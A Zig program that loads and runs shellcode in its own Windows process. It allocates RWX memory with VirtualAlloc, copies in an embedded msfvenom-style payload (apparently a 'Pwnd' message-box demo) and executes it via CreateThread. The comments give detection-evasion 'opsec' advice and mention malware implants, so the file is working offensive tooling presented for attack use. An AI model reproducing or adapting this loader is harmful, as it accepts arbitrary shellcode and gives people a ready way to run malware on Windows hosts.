const std = @import("std");
// Use std.os.windows as win, this providers wrappers for the Winodws APIs.
const win = @import("std").os.windows;

// Define inject_local function, it takes the shellcode as an argument
fn inject_local(shellcode: []u8) !void {
    // In this example, we use VirtualAlloc() to allocate memory for our shellcode and copy it

    // Allocate RWX (read-write-execute) memory to execute the shellcode from
    // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.VirtualAlloc, https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    var executable_memory_space = try win.VirtualAlloc(
        null, // Address to start allocation from. Null means 'anywhere'
        shellcode.len, // Size of allocation
        win.MEM_COMMIT | win.MEM_RESERVE, // Allocate memory immediately
        win.PAGE_EXECUTE_READWRITE, // Memory protection flags
    );

    // Convert the LPVOID (which is a *anyopaque type in Zig) result from VirtualAlloc() to a many-item pointer which can be used by @memcpy
    var executable_memory_ptr = @as([*]u8, @ptrCast(executable_memory_space));
    // Copy the shellcode into our assigned region of RWX memory
    @memcpy(executable_memory_ptr[0..shellcode.len], shellcode);

    // Create a thread at the start of the executable shellcode to run it!
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.kernel32.CreateThread, https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
    var thread_handle = win.kernel32.CreateThread(
        null, 
        0, 
        @ptrCast(@alignCast(executable_memory_space)), // lpStartAdress requires a function pointer, not the *anyopaque that executable_memory_space is, it can be casted to a function pointer using @ptrCast, the alignment of the pointer is fixed with @alignCast
        null, 
        0, 
        null
    );

    // Wait for our thread to exit to prevent program from closing before the shellcode ends
    // This is especially relevant for long-running shellcode, such as malware implants
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.kernel32.WaitForSingleObject, https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    _ = win.kernel32.WaitForSingleObject(
        thread_handle.?,
        win.INFINITE,
    );

    // WinAPI memory cleanup, free the memory we allocated earlier and close the thread handle
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.kernel32.VirtualFree, https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree
    _ = win.kernel32.VirtualFree(
        executable_memory_space,
        0,
        win.MEM_FREE,
    );
    _ = win.CloseHandle(thread_handle.?);
}

// Main function entrypoint
pub fn main() !void {
    // Define our shellcode as an array of 'u8' (unsigned 8-bit integers)
    // msfvenom does not currently support Zig directly, but its shellcode generation can still be used.
    var shellcode = [_]u8{ 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48, 0x8d, 0x8d, 0x1a, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x15, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x61, 0x78, 0x78, 0x65, 0x64, 0x00, 0x50, 0x77, 0x6e, 0x64, 0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
    // Run with variable, allows for error-return, useful in debugging, may be adjusted to use without.
    var inject = try inject_local(&shellcode);
    _ = inject;
}
